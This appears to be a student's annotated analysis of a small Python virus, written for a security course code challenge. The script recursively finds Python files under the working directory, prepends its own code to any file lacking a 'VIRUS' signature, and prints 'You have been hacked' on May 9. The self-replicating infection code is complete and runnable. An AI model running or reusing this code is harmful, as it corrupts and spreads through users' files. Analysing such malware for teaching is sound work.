#!/usr/bin/python3
# Script:   code challenge 14              
# Author: Raheem Sharif Reed                     
# Date of latest revision: June 16,2023     
# Purpose:erform an analysis of the Python-based code.
#Insert comments into each line of the script explaining in your own words what the virus is doing on this line.
#Insert comments above each function explaining what the purpose of this function is and what it hopes to carry out.
#Insert comments above the final three lines explaining how the functions are called and what this script appears to do.






import os
import datetime#The import os and import datetime statements import the necessary modules for working with operating system functions and datetime operations, respectively.

SIGNATURE = "VIRUS"#The line SIGNATURE = "VIRUS" assigns the string "VIRUS" to the variable SIGNATURE.



def locate(path):#The def locate(path): line starts the definition of the locate() function, which takes a parameter path
    files_targeted = []#files_targeted = [] initializes an empty list to store the files that match the criteria.
    filelist = os.listdir(path)#filelist = os.listdir(path) retrieves a list of files and directories within the given path directory.
    for fname in filelist:#The line for fname in filelist: represents a for loop that iterates over each element in the filelist iterable. 
        if os.path.isdir(path+"/"+fname):#The code if os.path.isdir(path+"/"+fname): checks whether the given path+"/"+fname represents a directory.
            files_targeted.extend(locate(path+"/"+fname))#The line files_targeted.extend(locate(path+"/"+fname)) in the provided code snippet is used to extend the files_targeted list with the elements returned by the locate() function.
        elif fname[-3:] == ".py":#he code snippet elif fname[-3:] == ".py": is an elif statement that checks if the last three characters of the filename (fname) match the string ".py". 
            infected = False#The line infected = False is a variable assignment statement in Python. It assigns the Boolean value False to the variable infected.
            for line in open(path+"/"+fname):#The line for line in open(path+"/"+fname): is a loop that iterates over each line in the file opened with the open() function.
                if SIGNATURE in line:#The code if SIGNATURE in line: is an if statement that checks if the value of the variable SIGNATURE is present within the string stored in the variable line
                    infected = True#The line infected = True is a simple assignment statement in Python. It assigns the boolean value True to the variable infected.
                    break
            if infected == False:#The line if infected == False: is a conditional statement that checks if the variable infected is equal to False
                files_targeted.append(path+"/"+fname)#The line files_targeted.append(path+"/"+fname) in the provided code snippet is used to add a file path to the files_targeted list.
    return files_targeted#the line return files_targeted in the provided code snippet is used to return the value of the variable files_targeted from the locate() function.

def infect(files_targeted):#The code def infect(files_targeted): is the beginning of a function definition in Python. The function is named infect and takes a parameter files_targeted. 
    virus = open(os.path.abspath(__file__))#The virus = open(os.path.abspath(__file__)) line opens the current script file in read mode. os.path.abspath(__file__) returns the absolute path of the current script file.
    virusstring = ""#The virusstring = "" line initializes an empty string called virusstring.
    for i,line in enumerate(virus):#The for i, line in enumerate(virus): line iterates over each line in the opened script file, and the enumerate() function provides both the line number (i) and the line content (line).
        if 0 <= i < 39:#The if 0 <= i < 39: line checks if the line number (i) is between 0 (inclusive) and 39 (exclusive). This condition is used to extract the first 39 lines of the script file.
            virusstring += line#If the condition in step the step above is true, the current line (line) is appended to the virusstring using the += operator.
    virus.close#The virus.close line attempts to close the file object representing the opened script file. However, it should be virus.close() to correctly invoke the close method.
    for fname in files_targeted:#The code then iterates over each file path (fname) in the files_targeted list.
       
        f = open(fname)#For each file, it opens the file in read mode with f = open(fname), reads the content of the file into the temp variable with temp = f.read(), and closes the file with f.close().
        temp = f.read()
        f.close()
        
        f = open(fname,"w")#reopens the same file in write mode with f = open(fname, "w").It writes the contents of the virusstring concatenated with the original file content (temp) to the file using f.write(virusstring + temp).Finally, it closes the file with f.close().
        f.write(virusstring + temp)
        f.close()
def detonate():#The def detonate(): line indicates the start of the function definition. The function is named "detonate."
    if datetime.datetime.now().month == 5 and datetime.datetime.now().day == 9:#The if datetime.datetime.now().month == 5 and datetime.datetime.now().day == 9: line checks if the current month is May (month 5) and the current day is the 9th.
#If the condition in step 2 is true, the code block inside the if statement is executed.
#The print("You have been hacked") line is within the if block. It prints the message "You have been hacked" to the console if the current date is May 9th.
        print("You have been hacked")#displays that the user has been hacked.

files_targeted = locate(os.path.abspath("")) #appears to be assigning the result of the locate() function to the variable files_targeted.The os.path.abspath("") function call is used to obtain the absolute path of the current working directory.
infect(files_targeted)
detonate() #terms like "infect" and "detonate" can be associated with malicious actions, particularly in the context of computer viruses or malware.